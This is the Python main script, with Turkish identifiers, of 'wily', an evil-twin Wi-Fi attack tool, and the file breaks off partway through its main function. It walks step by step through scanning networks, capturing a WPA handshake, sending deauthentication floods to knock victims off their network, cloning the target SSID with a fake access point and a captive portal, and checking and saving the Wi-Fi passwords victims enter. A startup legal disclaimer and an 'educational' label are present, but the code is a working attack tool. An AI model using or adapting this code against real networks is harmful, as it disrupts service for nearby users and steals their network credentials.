#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# wily - evil twin aracı

import os
import sys
import signal
import time
import argparse
import datetime
import select
import subprocess
from shutil import which
from importlib.util import find_spec

from cekirdek.yapilandirma import Renkler


# root kontrolü
def root_kontrol():
    """root yetkisi kontrolü yapar."""
    if os.geteuid() != 0:
        print("\n[!] bu araç root yetkisi gerektirir.")
        print("[!] lütfen 'sudo python3 wily.py' komutuyla çalıştırın.\n")
        sys.exit(1)


# bağımlılık kontrolü
def bagimlilik_kontrol():
    """gerekli sistem araçlarını kontrol eder."""
    gerekli_araclar = {
        'hostapd': 'hostapd',
        'dnsmasq': 'dnsmasq',
        'airmon-ng': 'aircrack-ng',
        'iptables': 'iptables'
    }

    eksik_araclar = []
    for arac, paket in gerekli_araclar.items():
        if which(arac) is None:
            eksik_araclar.append((arac, paket))

    if eksik_araclar:
        print(f"\n{Renkler.KIRMIZI}[!] eksik bağımlılıklar tespit edildi:{Renkler.SIFIRLA}\n")
        for arac, paket in eksik_araclar:
            print(f"    {Renkler.SARI}• {arac}{Renkler.SIFIRLA} (paket: {paket})")
        print(f"\n{Renkler.CYAN}[*] kurulum için: sudo bash kurulum.sh{Renkler.SIFIRLA}\n")
        sys.exit(1)

    # python bağımlılıklarını kontrol et
    if find_spec('scapy') is None:
        print(f"\n{Renkler.KIRMIZI}[!] scapy kütüphanesi bulunamadı.{Renkler.SIFIRLA}")
        print(f"{Renkler.CYAN}[*] kurulum için: pip3 install scapy{Renkler.SIFIRLA}\n")
        sys.exit(1)


# sinyal yakalayıcı
def sinyal_yakalayici(sinyal_no, cerceve):
    """çıkış sinyallerini yakalar ve temizlik yapar."""
    print(f"\n\n{Renkler.SARI}[!] çıkış sinyali alındı. temizlik yapılıyor...{Renkler.SIFIRLA}\n")
    temizlik_yap()
    sys.exit(0)


# global temizlik nesneleri
_arayuz_yoneticisi = None
_sahte_ap = None
_deauth_saldirisi = None
_portal = None
_monitor_arayuz = None


def temizlik_yap():
    """tüm bileşenleri durdurur ve temizlik yapar."""
    global _arayuz_yoneticisi, _sahte_ap, _deauth_saldirisi, _portal

    try:
        if _deauth_saldirisi:
            print(f"{Renkler.SARI}[*] deauth saldırısı durduruluyor...{Renkler.SIFIRLA}")
            _deauth_saldirisi.saldiri_durdur()
    except Exception:
        pass

    try:
        if _portal:
            print(f"{Renkler.SARI}[*] captive portal durduruluyor...{Renkler.SIFIRLA}")
            _portal.durdur()
    except Exception:
        pass

    try:
        if _sahte_ap:
            print(f"{Renkler.SARI}[*] sahte erişim noktası durduruluyor...{Renkler.SIFIRLA}")
            _sahte_ap.durdur()
    except Exception:
        pass

    try:
        if _arayuz_yoneticisi:
            print(f"{Renkler.SARI}[*] ağ arayüzleri eski haline getiriliyor...{Renkler.SIFIRLA}")
            _arayuz_yoneticisi.temizle()
    except Exception:
        pass

    print(f"\n{Renkler.YESIL}[✓] temizlik tamamlandı.{Renkler.SIFIRLA}\n")


def ayirici_yazdir():
    """ayırıcı çizgi yazdırır."""
    print(f"{Renkler.MOR}{'═' * 60}{Renkler.SIFIRLA}")


def adim_yazdir(adim_no, metin):
    """adım başlığı yazdırır."""
    print(f"\n{Renkler.CYAN}{'─' * 60}{Renkler.SIFIRLA}")
    print(f"{Renkler.KALIN}{Renkler.CYAN}  [{adim_no}] {metin}{Renkler.SIFIRLA}")
    print(f"{Renkler.CYAN}{'─' * 60}{Renkler.SIFIRLA}\n")


def kullanici_girdisi(mesaj, varsayilan=None):
    """kullanıcıdan girdi alır."""
    if varsayilan:
        girdi = input(f"{Renkler.YESIL}[?]{Renkler.SIFIRLA} {mesaj} [{varsayilan}]: ").strip()
        return girdi if girdi else varsayilan
    return input(f"{Renkler.YESIL}[?]{Renkler.SIFIRLA} {mesaj}: ").strip()


def secim_yap(secenekler, mesaj="seçiminizi yapın"):
    """numaralı listeden seçim yaptırır."""
    while True:
        secim = kullanici_girdisi(mesaj)
        try:
            secim_no = int(secim)
            if 1 <= secim_no <= len(secenekler):
                return secim_no - 1
            print(f"{Renkler.KIRMIZI}[!] geçersiz seçim. 1-{len(secenekler)} arası bir sayı girin.{Renkler.SIFIRLA}")
        except ValueError:
            print(f"{Renkler.KIRMIZI}[!] lütfen bir sayı girin.{Renkler.SIFIRLA}")


def yasal_uyari_goster():
    """yasal uyarı mesajını gösterir ve onay alır."""
    print(f"\n{Renkler.KIRMIZI}{'█' * 60}")
    print(f"█{'YASAL UYARI':^58s}█")
    print(f"{'█' * 60}{Renkler.SIFIRLA}\n")
    print(f"{Renkler.SARI}  bu araç yalnızca aşağıdaki amaçlar için kullanılabilir:{Renkler.SIFIRLA}\n")
    print(f"  {Renkler.BEYAZ}• eğitim ve öğretim amaçlı laboratuvar ortamları")
    print(f"  • yetkili penetrasyon testleri (yazılı izin gereklidir)")
    print(f"  • kablosuz ağ güvenliği araştırmaları{Renkler.SIFIRLA}\n")
    print(f"{Renkler.KIRMIZI}  yetkisiz kullanım yasa dışıdır ve cezai yaptırımlara")
    print(f"  tabi olabilir. tüm sorumluluk kullanıcıya aittir.{Renkler.SIFIRLA}\n")

    onay = kullanici_girdisi(
        f"{Renkler.KALIN}yukarıdaki koşulları kabul ediyor musunuz? (e/h){Renkler.SIFIRLA}"
    )

    if onay.lower() not in ('e', 'evet', 'y', 'yes'):
        print(f"\n{Renkler.KIRMIZI}[!] koşullar kabul edilmedi. çıkılıyor.{Renkler.SIFIRLA}\n")
        sys.exit(0)

    print(f"\n{Renkler.YESIL}[✓] koşullar kabul edildi.{Renkler.SIFIRLA}")


def otomatik_arayuz_baslat():
    """kablosuz arayüzü bulur ve monitor moda alır."""
    global _arayuz_yoneticisi, _monitor_arayuz

    from cekirdek.arayuz import ArayuzYoneticisi

    ayirici_yazdir()
    print(f"\n{Renkler.KALIN}{Renkler.CYAN}  [*] OTOMATİK ARAYÜZ BAŞLATMA{Renkler.SIFIRLA}\n")

    _arayuz_yoneticisi = ArayuzYoneticisi()
    arayuzler = _arayuz_yoneticisi.kablosuz_arayuzleri_listele()

    if not arayuzler:
        print(f"{Renkler.KIRMIZI}[!] kablosuz ağ arayüzü bulunamadı.{Renkler.SIFIRLA}")
        print(f"{Renkler.SARI}[*] uyumlu bir kablosuz adaptör takılı olduğundan emin olun.{Renkler.SIFIRLA}")
        return False

    # ilk kablosuz arayüzü seç
    secili_arayuz = arayuzler[0]
    _arayuz_yoneticisi.arayuz_sec(secili_arayuz)
    print(f"{Renkler.YESIL}[+] otomatik seçilen arayüz: {secili_arayuz}{Renkler.SIFIRLA}")

    # servisleri durdur ve monitor moda geç
    print(f"\n{Renkler.SARI}[*] çakışan servisler durduruluyor...{Renkler.SIFIRLA}")
    _arayuz_yoneticisi.network_manager_durdur()

    print(f"{Renkler.SARI}[*] monitor moda geçiliyor...{Renkler.SIFIRLA}")
    basarili = _arayuz_yoneticisi.monitor_modu_baslat()

    if not basarili:
        print(f"{Renkler.KIRMIZI}[!] monitor moda geçilemedi.{Renkler.SIFIRLA}")
        return False

    _monitor_arayuz = _arayuz_yoneticisi.monitor_arayuz
    print(f"{Renkler.YESIL}[✓] monitor mod aktif: {_monitor_arayuz}{Renkler.SIFIRLA}")
    ayirici_yazdir()
    return True


def ana_menu():
    """ana menüyü gösterir."""
    print(f"\n{Renkler.KALIN}{Renkler.BEYAZ}  ┌──────────────────────────────────────┐")
    print(f"  │         ANA MENÜ - WILY              │")
    print(f"  ├──────────────────────────────────────┤")
    print(f"  │  [1] otomatik saldırı (adım adım)   │")
    print(f"  │  [2] sadece ağ taraması              │")
    print(f"  │  [3] sadece deauth saldırısı         │")
    print(f"  │  [4] sadece sahte ap oluştur         │")
    print(f"  │  [5] yakalanan bilgileri göster       │")
    print(f"  │  [0] çıkış                           │")
    print(f"  └──────────────────────────────────────┘{Renkler.SIFIRLA}\n")


def otomatik_saldiri():
    """adım adım tam saldırı akışını yürütür."""
    global _arayuz_yoneticisi, _sahte_ap, _deauth_saldirisi, _portal, _monitor_arayuz

    from cekirdek.tarayici import AgTarayici
    from cekirdek.deauth import DeauthSaldirisi
    from cekirdek.sahte_ap import SahteErisimNoktasi
    from cekirdek.portal import CaptivePortal
    from cekirdek.handshake import HandshakeYakalayici

    if not _monitor_arayuz:
        print(f"{Renkler.KIRMIZI}[!] monitor arayüz hazır değil. araç düzgün başlatılamamış.{Renkler.SIFIRLA}")
        return

    monitor_arayuz = _monitor_arayuz
    secili_arayuz = _arayuz_yoneticisi.orijinal_arayuz

    print(f"\n{Renkler.YESIL}[✓] aktif monitor arayüz: {monitor_arayuz}{Renkler.SIFIRLA}")

    # adım 1: ağ taraması
    adim_yazdir("1/7", "KABLOSUZ AĞ TARAMASI")

    tarayici = AgTarayici(monitor_arayuz)
    tarama_suresi = int(kullanici_girdisi("tarama süresi (saniye)", "30"))

    print(f"\n{Renkler.SARI}[*] ağlar taranıyor ({tarama_suresi} saniye)...{Renkler.SIFIRLA}")
    print(f"{Renkler.SARI}[*] taramayı durdurmak için sürenin dolmasını bekleyin.{Renkler.SIFIRLA}\n")

    tarayici.tum_kanallari_tara(sure=tarama_suresi)

    # taramanın bitmesini bekle
    if tarayici._tarama_ipligi:
        tarayici._tarama_ipligi.join(timeout=tarama_suresi + 5)

    print(f"\n{Renkler.YESIL}[✓] tarama tamamlandı.{Renkler.SIFIRLA}")

    if not tarayici.erisim_noktalari:
        print(f"\n{Renkler.KIRMIZI}[!] hiçbir erişim noktası bulunamadı.{Renkler.SIFIRLA}")
        return

    sirali_aplar = tarayici.erisim_noktalarini_goster()
    if not sirali_aplar:
        sirali_aplar = tarayici.erisim_noktalari

    # adım 2: hedef ağ seçimi
    adim_yazdir("2/7", "HEDEF AĞ SEÇİMİ")

    secim = secim_yap(sirali_aplar, "hedef ağ numarası")
    hedef = sirali_aplar[secim]

    hedef_ssid = hedef['ssid']
    hedef_bssid = hedef['bssid']
    hedef_kanal = hedef['kanal']

    print(f"\n{Renkler.YESIL}[✓] hedef seçildi:{Renkler.SIFIRLA}")
    print(f"    {Renkler.BEYAZ}SSID   : {hedef_ssid}")
    print(f"    BSSID  : {hedef_bssid}")
    print(f"    Kanal  : {hedef_kanal}{Renkler.SIFIRLA}")

    # hedef ağdaki istemcileri tara
    print(f"\n{Renkler.SARI}[*] hedef ağa bağlı istemciler taranıyor (10 saniye)...{Renkler.SIFIRLA}")
    tarayici.kanal_degistir(hedef_kanal)
    tarayici.tarama_baslat(sure=10)

    hedef_istemciler = [
        istemci for istemci in tarayici.istemciler
        if istemci['bssid'].lower() == hedef_bssid.lower()
    ]

    if hedef_istemciler:
        tarayici.istemcileri_goster(hedef_bssid)
    else:
        print(f"{Renkler.SARI}[*] bağlı istemci bulunamadı. broadcast kullanılacak.{Renkler.SIFIRLA}")

    # adım 3: handshake yakalama
    adim_yazdir("3/7", "WPA HANDSHAKE YAKALAMA")

    istemci_macleri = [i['mac'] for i in hedef_istemciler] if hedef_istemciler else []

    handshake = HandshakeYakalayici(
        arayuz=monitor_arayuz,
        hedef_bssid=hedef_bssid,
        hedef_ssid=hedef_ssid,
        hedef_kanal=hedef_kanal,
        istemci_macleri=istemci_macleri
    )

    yakalama_suresi = int(kullanici_girdisi("handshake yakalama süresi (saniye)", "30"))

    print(f"\n{Renkler.SARI}[*] kanala kilitlendi: {hedef_kanal}{Renkler.SIFIRLA}")
    tarayici.kanal_degistir(hedef_kanal)

    basarili = handshake.yakala(sure=yakalama_suresi)

    if not basarili:
        print(f"\n{Renkler.KIRMIZI}[!] handshake yakalanamadı.{Renkler.SIFIRLA}")
        tekrar = kullanici_girdisi("tekrar denemek ister misiniz? (e/h)", "e")
        if tekrar.lower() in ('e', 'evet'):
            basarili = handshake.yakala(sure=yakalama_suresi + 15)

        if not basarili:
            print(f"{Renkler.KIRMIZI}[!] handshake yakalanamadı. saldırı iptal ediliyor.{Renkler.SIFIRLA}")
            return

    print(f"\n{Renkler.YESIL}[✓] handshake başarıyla yakalandı!{Renkler.SIFIRLA}")

    # adım 4: yoğun deauth bombardımanı
    adim_yazdir("4/7", "YOĞUN DEAUTH BOMBARDIMANI")

    print(f"{Renkler.SARI}[*] kurbanların gerçek ağdan koparılması için yoğun deauth başlatılıyor...{Renkler.SIFIRLA}")
    print(f"{Renkler.SARI}[*] monitor mod hâlâ aktif — tüm cihazlara deauth gönderilecek.{Renkler.SIFIRLA}")

    yogun_deauth = DeauthSaldirisi(monitor_arayuz)

    # kanalı kilitle
    tarayici.kanal_degistir(hedef_kanal)

    yogun_deauth.yogun_deauth_gonder(
        erisim_noktasi_mac=hedef_bssid,
        istemci_listesi=istemci_macleri if istemci_macleri else None,
        sure=15,
        aralik=0.02
    )

    print(f"{Renkler.YESIL}[✓] yoğun deauth tamamlandı — cihazlar düşürüldü.{Renkler.SIFIRLA}")

    # adım 5: sahte erişim noktası ve captive portal
    adim_yazdir("5/7", "SAHTE ERİŞİM NOKTASI + CAPTİVE PORTAL")

    # sahte ap için monitor modu durdur
    print(f"{Renkler.SARI}[*] sahte ap için monitor mod durduruluyor...{Renkler.SIFIRLA}")
    _arayuz_yoneticisi.monitor_modu_durdur()
    _monitor_arayuz = None

    ap_arayuz = secili_arayuz

    print(f"\n{Renkler.SARI}[*] sahte erişim noktası yapılandırılıyor...{Renkler.SIFIRLA}")

    _sahte_ap = SahteErisimNoktasi(
        arayuz=ap_arayuz,
        ssid=hedef_ssid,
        kanal=hedef_kanal
    )

    ap_basarili = _sahte_ap.baslat()

    if not ap_basarili:
        print(f"{Renkler.KIRMIZI}[!] sahte erişim noktası başlatılamadı.{Renkler.SIFIRLA}")
        print(f"{Renkler.SARI}[*] monitor mod geri yükleniyor...{Renkler.SIFIRLA}")
        _arayuz_yoneticisi.arayuz_sec(secili_arayuz)
        if _arayuz_yoneticisi.monitor_modu_baslat():
            _monitor_arayuz = _arayuz_yoneticisi.monitor_arayuz
        return

    print(f"{Renkler.YESIL}[✓] sahte erişim noktası aktif: {hedef_ssid}{Renkler.SIFIRLA}")

    # captive portalı başlat
    print(f"\n{Renkler.SARI}[*] captive portal başlatılıyor (hash doğrulama aktif)...{Renkler.SIFIRLA}")

    _portal = CaptivePortal(
        hedef_ssid=hedef_ssid,
        handshake_yakalayici=handshake,
        dogrulama_callback=lambda sifre: None
    )

    _portal.baslat()
    print(f"{Renkler.YESIL}[✓] captive portal aktif (port 80) — hash doğrulama açık{Renkler.SIFIRLA}")

    # adım 6: sürekli deauth
    adim_yazdir("6/7", "SÜREKLİ DEAUTH SALDIRISI")

    # ikinci adaptörü ara
    ikinci_adaptor = None
    try:
        from cekirdek.arayuz import ArayuzYoneticisi
        ikinci_yonetici = ArayuzYoneticisi()
        arayuzler = ikinci_yonetici.kablosuz_arayuzleri_listele()
        for arayuz in arayuzler:
            if arayuz != secili_arayuz:
                ikinci_adaptor = arayuz
                break
    except Exception:
        pass

    _deauth_saldirisi_surekli = None

    if ikinci_adaptor:
        print(f"\n{Renkler.YESIL}[+] ikinci adaptör bulundu: {ikinci_adaptor}{Renkler.SIFIRLA}")
        print(f"{Renkler.SARI}[*] ikinci adaptör monitor moda alınıyor...{Renkler.SIFIRLA}")

        ikinci_yonetici.arayuz_sec(ikinci_adaptor)
        if ikinci_yonetici.monitor_modu_baslat():
            deauth_arayuz = ikinci_yonetici.monitor_arayuz

            # kanalı ayarla
            try:
                subprocess.run(
                    ['iwconfig', deauth_arayuz, 'channel', str(hedef_kanal)],
                    capture_output=True
                )
            except Exception:
                pass

            _deauth_saldirisi_surekli = DeauthSaldirisi(deauth_arayuz)

            if hedef_istemciler:
                istemci_macleri = [i['mac'] for i in hedef_istemciler]
                _deauth_saldirisi_surekli.toplu_surekli_deauth_baslat(
                    hedef_bssid, istemci_macleri
                )
            else:
                _deauth_saldirisi_surekli.surekli_deauth_baslat(
                    'ff:ff:ff:ff:ff:ff', hedef_bssid
                )

            print(f"{Renkler.YESIL}[✓] sürekli deauth aktif{Renkler.SIFIRLA}")
        else:
            print(f"{Renkler.SARI}[!] ikinci adaptör monitor moda alınamadı. deauth atlanıyor.{Renkler.SIFIRLA}")
    else:
        print(f"\n{Renkler.SARI}[!] ikinci kablosuz adaptör bulunamadı.{Renkler.SIFIRLA}")
        print(f"{Renkler.SARI}[*] sahte ap başlatılmadan önce deauth gönderildi (adım 3).{Renkler.SIFIRLA}")
        print(f"{Renkler.SARI}[*] hedefin sahte ap'ye bağlanması bekleniyor...{Renkler.SIFIRLA}")

    # adım 7: bekleme ve otomatik sonlandırma
    adim_yazdir("7/7", "ŞİFRE DOĞRULAMA BEKLENİYOR")

    ayirici_yazdir()
    print(f"\n{Renkler.KALIN}{Renkler.YESIL}  [✓] SALDIRI AKTİF{Renkler.SIFIRLA}\n")
    print(f"  {Renkler.BEYAZ}sahte ap    : {hedef_ssid}")
    print(f"  portal     : http://10.0.0.1")
    print(f"  hedef      : {hedef_bssid}")
    print(f"  doğrulama  : hash ile otomatik{Renkler.SIFIRLA}\n")
    print(f"  {Renkler.SARI}hedef captive portal'a şifre girdiğinde otomatik doğrulanacak.")
    print(f"  doğru şifre girilirse saldırı otomatik sonlanacak.")
    print(f"  'b' → yakalanan bilgiler | 'q' veya ctrl+c → manuel durdur{Renkler.SIFIRLA}\n")
    ayirici_yazdir()

    sifre_bulundu = False
    bulunan_sifre = None

    try:
        # şifre doğrulamasını izle
        while True:
            # şifre kontrolü
            if _portal and _portal.sifre_dogrulandi:
                bulunan_sifre = _portal.dogrulanan_sifre
                sifre_bulundu = True
                print(f"\n\n{'═' * 60}")
                print(f"{Renkler.KALIN}{Renkler.YESIL}")
                print(f"  ╔══════════════════════════════════════════╗")
                print(f"  ║        ŞİFRE BAŞARIYLA DOĞRULANDI!       ║")
                print(f"  ╠══════════════════════════════════════════╣")
                print(f"  ║                                          ║")
                print(f"  ║  Ağ    : {hedef_ssid:<31s} ║")
                print(f"  ║  Şifre : {bulunan_sifre:<31s} ║")
                print(f"  ║                                          ║")
                print(f"  ╚══════════════════════════════════════════╝")
                print(f"{Renkler.SIFIRLA}")
                print(f"{'═' * 60}\n")

                # yönlendirme için bekle
                print(f"{Renkler.SARI}[*] kurbanın bağlantı sayfasını görmesi için 5 saniye bekleniyor...{Renkler.SIFIRLA}")
                time.sleep(5)

                # şifreyi dosyaya kaydet
                try:
                    kayit_dizini = os.path.join(
                        os.path.dirname(os.path.abspath(__file__)),
                        'kayitlar'
                    )
                    sifre_dosyasi = os.path.join(kayit_dizini, 'bulunan_sifreler.txt')
                    with open(sifre_dosyasi, 'a', encoding='utf-8') as dosya:
                        dosya.write("=" * 50 + "\n")
                        dosya.write(f"tarih    : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        dosya.write(f"ağ adı   : {hedef_ssid}\n")
                        dosya.write(f"bssid    : {hedef_bssid}\n")
                        dosya.write(f"şifre    : {bulunan_sifre}\n")
                        dosya.write(f"doğrulama: handshake hash ile doğrulandı ✓\n")
                        dosya.write("=" * 50 + "\n\n")
                    print(f"{Renkler.YESIL}[✓] şifre kaydedildi: {sifre_dosyasi}{Renkler.SIFIRLA}")
                except Exception:
                    pass

                break

            # kullanıcı girdisini kontrol et
            try:
                if sys.stdin in select.select([sys.stdin], [], [], 0.5)[0]:
                    girdi = sys.stdin.readline().strip().lower()
                    if girdi == 'b':
                        _portal.yakalanan_bilgileri_goster()
                    elif girdi in ('q', 'cikis', 'exit'):
                        break
            except (ValueError, OSError):
                # hata durumunda bekle
                time.sleep(0.5)

    except (KeyboardInterrupt, EOFError):
        print(f"\n{Renkler.SARI}[*] kullanıcı tarafından durduruldu.{Renkler.SIFIRLA}")
    finally:
        # temizlik yap
        print(f"\n{Renkler.SARI}[*] temizlik yapılıyor — her şey eski haline dönüyor...{Renkler.SIFIRLA}\n")

        # sürekli deauth'u durdur
        if _deauth_saldirisi_surekli and _deauth_saldirisi_surekli.saldiri_aktif:
            print(f"{Renkler.SARI}[*] sürekli deauth durduruluyor...{Renkler.SIFIRLA}")
            _deauth_saldirisi_surekli.saldiri_durdur()
            # ikinci adaptörü temizle
            try:
                ikinci_yonetici.temizle()
            except Exception:
                pass

        # portalı durdur
        if _portal:
            print(f"{Renkler.SARI}[*] captive portal durduruluyor...{Renkler.SIFIRLA}")
            _portal.durdur()
            _portal = None

        # sahte ap'yi durdur
        if _sahte_ap:
            print(f"{Renkler.SARI}[*] sahte erişim noktası durduruluyor...{Renkler.SIFIRLA}")
            _sahte_ap.durdur()
            _sahte_ap = None

        # ağ ayarlarını geri yükle
        print(f"{Renkler.SARI}[*] ağ ayarları eski haline getiriliyor...{Renkler.SIFIRLA}")
        _arayuz_yoneticisi.temizle()
        _monitor_arayuz = None

        if sifre_bulundu:
            print(f"\n{Renkler.YESIL}[✓] saldırı başarıyla tamamlandı!{Renkler.SIFIRLA}")
            print(f"{Renkler.YESIL}[✓] kurbanların internet bağlantısı geri yüklendi.{Renkler.SIFIRLA}")
            print(f"\n{Renkler.KALIN}{Renkler.BEYAZ}  ┌──────────────────────────────────────────┐")
            print(f"  │  SONUÇ                                   │")
            print(f"  ├──────────────────────────────────────────┤")
            print(f"  │  Ağ    : {hedef_ssid:<30s} │")
            print(f"  │  Şifre : {bulunan_sifre:<30s} │")
            print(f"  └──────────────────────────────────────────┘{Renkler.SIFIRLA}")

        print(f"\n{Renkler.YESIL}[✓] temizlik tamamlandı. sistem eski haline döndü.{Renkler.SIFIRLA}\n")


def sadece_tarama():
    """yalnızca ağ taraması yapar."""
    global _monitor_arayuz

    from cekirdek.tarayici import AgTarayici

    if not _monitor_arayuz:
        print(f"{Renkler.KIRMIZI}[!] monitor arayüz hazır değil. araç düzgün başlatılamamış.{Renkler.SIFIRLA}")
        return

    adim_yazdir("1/1", "AĞ TARAMASI")

    print(f"{Renkler.YESIL}[+] aktif monitor arayüz: {_monitor_arayuz}{Renkler.SIFIRLA}\n")

    tarayici = AgTarayici(_monitor_arayuz)
    tarama_suresi = int(kullanici_girdisi("tarama süresi (saniye)", "30"))

    print(f"\n{Renkler.SARI}[*] ağlar taranıyor ({tarama_suresi} saniye)...{Renkler.SIFIRLA}\n")
    tarayici.tum_kanallari_tara(sure=tarama_suresi)

    # taramanın bitmesini bekle
    if tarayici._tarama_ipligi:
        tarayici._tarama_ipligi.join(timeout=tarama_suresi + 5)

    tarayici.erisim_noktalarini_goster()


def sadece_deauth():
    """yalnızca deauth saldırısı yapar."""
    global _deauth_saldirisi, _monitor_arayuz

    from cekirdek.deauth import DeauthSaldirisi

    if not _monitor_arayuz:
        print(f"{Renkler.KIRMIZI}[!] monitor arayüz hazır değil. araç düzgün başlatılamamış.{Renkler.SIFIRLA}")
        return

    adim_yazdir("1/1", "DEAUTH SALDIRISI")

    print(f"{Renkler.YESIL}[+] aktif monitor arayüz: {_monitor_arayuz}{Renkler.SIFIRLA}\n")

    hedef_bssid = kullanici_girdisi("hedef erişim noktası BSSID (mac adresi)")
    hedef_mac = kullanici_girdisi("hedef istemci MAC adresi (broadcast için: ff:ff:ff:ff:ff:ff)", "ff:ff:ff:ff:ff:ff")
    paket_sayisi = int(kullanici_girdisi("paket sayısı", "100"))

    _deauth_saldirisi = DeauthSaldirisi(_monitor_arayuz)

    print(f"\n{Renkler.SARI}[*] deauth saldırısı başlatılıyor...{Renkler.SIFIRLA}")
    print(f"{Renkler.SARI}[*] durdurmak için ctrl+c tuşlarına basın.{Renkler.SIFIRLA}\n")

    _deauth_saldirisi.saldiri_baslat(hedef_mac, hedef_bssid, paket_sayisi)

    try:
        while _deauth_saldirisi.saldiri_aktif:
            time.sleep(1)
    except KeyboardInterrupt:
        _deauth_saldirisi.saldiri_durdur()
        print(f"\n{Renkler.YESIL}[✓] deauth saldırısı durduruldu.{Renkler.SIFIRLA}")


def sadece_sahte_ap():
    """yalnızca sahte erişim noktası oluşturur."""
    global _sahte_ap, _portal, _arayuz_yoneticisi, _monitor_arayuz

    from cekirdek.sahte_ap import SahteErisimNoktasi
    from cekirdek.portal import CaptivePortal
    from cekirdek.arayuz import ArayuzYoneticisi

    adim_yazdir("1/1", "SAHTE ERİŞİM NOKTASI")

    arayuz = kullanici_girdisi("kullanılacak kablosuz arayüz (örn: wlan0)")
    ssid = kullanici_girdisi("sahte ağ adı (SSID)")
    kanal = int(kullanici_girdisi("kanal", "6"))

    # monitor modu durdur
    if _arayuz_yoneticisi and _arayuz_yoneticisi.monitor_arayuz:
        print(f"{Renkler.SARI}[*] sahte ap için monitor mod durduruluyor...{Renkler.SIFIRLA}")
        _arayuz_yoneticisi.monitor_modu_durdur()
        _monitor_arayuz = None
        if arayuz.endswith('mon'):
            arayuz = arayuz[:-3]
    elif arayuz.endswith('mon'):
        print(f"{Renkler.SARI}[*] monitor mod kapatılıyor: {arayuz}{Renkler.SIFIRLA}")
        yonetici = ArayuzYoneticisi()
        yonetici.monitor_arayuz = arayuz
        yonetici.monitor_modu_durdur()
        arayuz = arayuz[:-3]

    _sahte_ap = SahteErisimNoktasi(arayuz, ssid, kanal)

    print(f"\n{Renkler.SARI}[*] sahte erişim noktası başlatılıyor...{Renkler.SIFIRLA}")
    basarili = _sahte_ap.baslat()

    if not basarili:
        print(f"{Renkler.KIRMIZI}[!] sahte erişim noktası başlatılamadı.{Renkler.SIFIRLA}")
        return

    print(f"{Renkler.YESIL}[✓] sahte erişim noktası aktif: {ssid}{Renkler.SIFIRLA}")

    portal_sor = kullanici_girdisi("captive portal da başlatılsın mı? (e/h)", "e")
    if portal_sor.lower() in ('e', 'evet'):
        _portal = CaptivePortal()
        _portal.baslat()
        print(f"{Renkler.YESIL}[✓] captive portal aktif (port 80){Renkler.SIFIRLA}")

    print(f"\n{Renkler.SARI}[*] durdurmak için ctrl+c veya 'q' tuşuna basın.{Renkler.SIFIRLA}")

    try:
        while True:
            girdi = input().strip().lower()
            if girdi == 'b' and _portal:
                _portal.yakalanan_bilgileri_goster()
            elif girdi in ('q', 'cikis', 'exit'):
                break
    except (KeyboardInterrupt, EOFError):
        pass
    finally:
        print(f"\n{Renkler.SARI}[*] sahte ap ve portal durduruluyor...{Renkler.SIFIRLA}")
        if _portal:
            _portal.durdur()
            _portal = None
        if _sahte_ap:
            _sahte_ap.durdur()
            _sahte_ap = None

        if _arayuz_yoneticisi and _arayuz_yoneticisi.orijinal_arayuz:
            print(f"{Renkler.SARI}[*] monitor mod geri yükleniyor...{Renkler.SIFIRLA}")
            _arayuz_yoneticisi.arayuz_sec(_arayuz_yoneticisi.orijinal_arayuz)
            if _arayuz_yoneticisi.monitor_modu_baslat():
                _monitor_arayuz = _arayuz_yoneticisi.monitor_arayuz


def yakalanan_bilgileri_goster():
    """yakalanan bilgileri dosyadan okur ve gösterir."""
    kayit_dosyasi = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        'kayitlar',
        'yakalanan_bilgiler.txt'
    )

    if not os.path.exists(kayit_dosyasi):
        print(f"\n{Renkler.SARI}[*] henüz yakalanan bilgi yok.{Renkler.SIFIRLA}\n")
        return

    print(f"\n{Renkler.KALIN}{Renkler.MOR}  ╔══════════════════════════════════════╗")
    print(f"  ║       YAKALANAN BİLGİLER             ║")
    print(f"  ╚══════════════════════════════════════╝{Renkler.SIFIRLA}\n")

    with open(kayit_dosyasi, 'r', encoding='utf-8') as dosya:
        icerik = dosya.read()

    if not icerik.strip():
        print(f"  {Renkler.SARI}henüz yakalanan bilgi yok.{Renkler.SIFIRLA}\n")
    else:
        print(f"{Renkler.BEYAZ}{icerik}{Renkler.SIFIRLA}")


def arguman_ayristirici():
    """komut satırı argümanlarını ayrıştırır."""
    ayristirici = argparse.ArgumentParser(
        description='wily - evil twin (sahte erişim noktası) eğitim aracı',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
örnekler:
  sudo python3 wily.py                    # interaktif menü
  sudo python3 wily.py --tara             # sadece ağ taraması
  sudo python3 wily.py --deauth           # sadece deauth saldırısı
  sudo python3 wily.py --sahte-ap         # sadece sahte ap oluştur

uyarı:
  bu araç yalnızca eğitim amaçlıdır.
  yetkisiz kullanım yasa dışıdır.
        """
    )

    ayristirici.add_argument(
        '--tara', action='store_true',
        help='sadece ağ taraması yap'
    )
    ayristirici.add_argument(
        '--deauth', action='store_true',
        help='sadece deauth saldırısı yap'
    )
    ayristirici.add_argument(
        '--sahte-ap', action='store_true',
        help='sadece sahte erişim noktası oluştur'
    )
    ayristirici.add_argument(
        '--bilgiler', action='store_true',
        help='yakalanan bilgileri göster'
    )
    ayristirici.add_argument(
        '--surum', action='version',
        version='wily 1.0.0'
    )

    return ayristirici.parse_args()


def ana():
    """ana program akışı."""

    # root ve bağımlılık kontrolü
    root_kontrol()
    bagimlilik_kontrol()

    # yardımcı fonksiyonları yükle
    from cekirdek.yapilandirma import banner_goster, log_dizini_olustur

    # sinyal yakalayıcıları kaydet
    signal.signal(signal.SIGINT, sinyal_yakalayici)
    signal.signal(signal.SIGTERM, sinyal_yakalayici)

    # kayıt dizinini oluştur
    log_dizini_olustur()

    # argümanları ayrıştır
    argumanlar = arguman_ayristirici()

    # banner göster
    banner_goster()

    # komut satırı argümanlarını işle
    if argumanlar.bilgiler:
        yakalanan_bilgileri_goster()
        return

    # monitor modu başlat
    if argumanlar.tara or argumanlar.deauth or argumanlar.sahte_ap:
        if not otomatik_arayuz_baslat():
            print(f"\n{Renkler.KIRMIZI}[!] kablosuz arayüz başlatılamadı. çıkılıyor.{Renkler.SIFIRLA}")
            temizlik_yap()
            return

        if argumanlar.tara:
            sadece_tarama()
        elif argumanlar.deauth:
            sadece_deauth()
        elif argumanlar.sahte_ap:
            sadece_sahte_ap()

        temizlik_yap()
        return

    # yasal uyarı
    yasal_uyari_goster()

    # otomatik arayüz başlatma
